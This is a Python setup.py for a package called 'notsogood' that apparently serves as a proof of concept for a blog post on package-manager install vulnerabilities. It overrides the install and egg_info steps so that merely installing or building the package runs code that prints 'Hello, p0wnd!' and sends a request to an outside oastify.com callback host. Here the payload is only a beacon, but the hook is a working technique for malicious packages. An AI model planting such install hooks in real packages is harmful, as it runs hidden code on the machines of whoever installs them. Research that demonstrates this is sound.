#https://embracethered.com/blog/posts/2022/python-package-manager-install-and-download-vulnerability/

import requests
# import pandas as pd
# import numpy as np
# import matplotlib.pyplot as plt
from setuptools import setup, find_packages
from setuptools.command.install import install
from setuptools.command.egg_info import egg_info



def RunCommand():
    print("Hello, p0wnd!")
    response = requests.get('https://2ad34wme4nmxhog653h69en3xu3m0ap.oastify.com')

class RunEggInfoCommand(egg_info):
    def run(self):
        RunCommand()
        egg_info.run(self)


class RunInstallCommand(install):
    def run(self):
        RunCommand()
        install.run(self)

setup(
    name = "notsogood",
    version = "0.0.1",
    license = "MIT",
    packages=find_packages(),
    cmdclass={
        'install' : RunInstallCommand,
        'egg_info': RunEggInfoCommand
    },
)